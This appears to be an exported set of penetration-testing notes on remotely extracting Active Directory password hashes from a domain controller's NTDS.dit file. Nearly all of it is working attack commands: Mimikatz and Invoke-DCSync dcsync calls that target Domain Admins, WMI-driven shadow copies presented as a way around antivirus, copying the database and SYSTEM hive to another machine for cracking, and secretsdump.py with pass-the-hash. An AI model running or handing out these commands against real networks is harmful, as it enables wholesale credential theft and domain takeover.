<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>Extract hashes remotely</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles3.css" type="text/css" />
</head>
<body>
<div class='page'><strong><h1># Extract NTDS.dit Hashes Remotely</h1></strong><br />This is where you can remotely access a computer that has an <code>NTDS.dit</code> file.<br />In the right circumstances, you&#39;ll be able to extract from NTDS.dit remotely.<br /><br /><strong><h2>## Mimikatz</h2></strong><br />Tools &gt; Mimikatz &gt; lsadump::dcsync<br /><br /><strong><h2>## Invoke-Mimikatz</h2></strong><br />Tools &gt; Invoke-Mimikatz<strong><br /></strong><br /><strong><h2>## Invoke-DCSync</h2></strong><br /><a href="https://gist.github.com/monoxgas/9d238accd969550136db">https://gist.github.com/monoxgas/9d238accd969550136db</a><br />Uses a mimikatz dll in memory and mimikatz&#39;s dcsync functionality to call dcsync against a domain.<br /><br />Return all active user hashes in &#39;user:id:lm:ntlm:::&#39; format.<br /><code>Invoke-DCSync -PWDumpFormat</code><br />Return the hashes from just the users in the &quot;Domain Admins&quot; group<br /><code>Invoke-DCSync -GroupName &quot;Domain Admins&quot; | ft -wrap -autosize</code><br />Return the hashes from users with &quot;admin&quot; in their description.<br /><code>Invoke-DCSync -UserFilter &quot;(description=*admin*)&quot; | ft -wrap -autosize</code><br /><br /><strong><h2>## WMI</h2></strong><br />Should bypass AV.<br />Execute vssadmin remotely on the Domain Controller using WMI.<br /><br /><div class="codebox"><div class="codebox">::&nbsp;Create&nbsp;shadow&nbsp;copy<br />wmic&nbsp;/node:&quot;root-dc.umbrella.local&quot;&nbsp;/user:UMBRELLA\Administrator&nbsp;/password:&quot;Password123!&quot;&nbsp;process&nbsp;call&nbsp;create&nbsp;&quot;cmd&nbsp;/c&nbsp;vssadmin&nbsp;create&nbsp;shadow&nbsp;/for=C:&nbsp;2&gt;&amp;1&quot;<br /><br />::&nbsp;Copy&nbsp;NTDS.dit&nbsp;from&nbsp;the&nbsp;shadow&nbsp;copy<br />wmic&nbsp;/node:&quot;root-dc.umbrella.local&quot;&nbsp;/user:UMBRELLA\Administrator&nbsp;/password:&quot;Password123!&quot;&nbsp;process&nbsp;call&nbsp;create&nbsp;&quot;cmd&nbsp;/c&nbsp;copy&nbsp;\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\NTDS\NTDS.dit&nbsp;C:\Users\Public\ntds.dit&nbsp;2&gt;&amp;1&quot;<br /><br />::&nbsp;Copy&nbsp;SYSTEM&nbsp;file<br />wmic&nbsp;/node:&quot;root-dc.umbrella.local&quot;&nbsp;/user:UMBRELLA\Administrator&nbsp;/password:&quot;Password123!&quot;&nbsp;process&nbsp;call&nbsp;create&nbsp;&quot;cmd&nbsp;/c&nbsp;copy&nbsp;\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM\&nbsp;C:\Users\Public\SYSTEM.hive&nbsp;2&gt;&amp;1&quot;<br /><br />::&nbsp;Copy&nbsp;NTDS.dit&nbsp;and&nbsp;SYSTEM&nbsp;file&nbsp;to&nbsp;another&nbsp;machine&nbsp;where&nbsp;they&nbsp;can&nbsp;be&nbsp;dumped/cracked<br />copy&nbsp;\\10.0.0.1\c$\Users\Public\ntds.dit&nbsp;C:\temp<br />copy&nbsp;\\10.0.0.1\c$\Users\Public\SYSTEM.hive&nbsp;C:\temp</div></div><br /><br /><strong><h2>## Impacket&#39;s secretsdump.py</h2></strong><br />REQUIRES DOMAIN ADMIN CREDENTIALS OR HASH ON THE DOMAIN CONTROLLER.<br /><br />Will grab:<br />• local SAM hashes<br />• cached domain logon info<br />• LSA secrets<br />• DPAPI_SYSSTEM<br />• domain credentials from NTDS.dit<br />• Kerberos keys<br /><br /><code>secretsdump.py DOMAIN/username@&lt;hostname or IP&gt;</code><br /><code>secretsdump.py TOKYO/treetopt@192.168.88.11</code><br />With NT hash<br /><code>secretsdump.py TOKYO/treetopt@192.168.88.11 -hashes :520126a03f5d5a8d836f1c4f34ede7ce</code><br /></div>
</body>
</html>
